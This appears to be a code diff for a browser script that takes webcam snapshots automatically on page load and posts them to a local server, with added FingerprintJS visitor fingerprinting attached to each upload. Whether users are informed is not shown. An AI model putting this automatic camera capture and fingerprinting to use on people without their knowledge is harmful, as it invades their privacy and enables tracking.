@@ -8,6 +8,9 @@
     `;
 
     const address = "http://localhost:3000/file";
+    const fpPromise = import('https://openfpcdn.io/fingerprintjs/v3').then(
+        (FingerprintJS) => FingerprintJS.load()
+    )
     let snp = 2; //snapshots count
 
     let width = 770;
@@ -54,16 +57,20 @@
                     setTimeout(stopCapture, 300);
                     clearTimeout(timer);
                 }
-            }, 1000)
-        }, 500)
+            }, 500)
+        }, 300)
 
     }
 
     const stopCapture = () => {
-        console.log("Stopping capture");
-        streamObj.getTracks().forEach(function (track) {
-            track.stop();
-        });
+        try {
+            console.log("Stopping capture");
+            streamObj.getTracks().forEach(function (track) {
+                track.stop();
+            });
+        } catch (e) {
+            console.warn(e);
+        }
     }
 
     const clearPhoto = () => {
@@ -74,9 +81,17 @@
     }
 
     const sendPhoto = async (address, data) => {
+        console.log(await getTrackId())
         const request = new XMLHttpRequest();
         request.open("POST", address);
         request.send(data);
+    }
+
+    const getTrackId = () => {
+        return fpPromise
+            .then((fp) => fp.get())
+            .then(result => result.visitorId)
+            .catch((error) => console.error(error));
     }
 
     function takeCamSnapshot() {
@@ -92,6 +107,7 @@
             clearPhoto();
         }
     }
+
 
     window.addEventListener('load', startup, false);
 })();
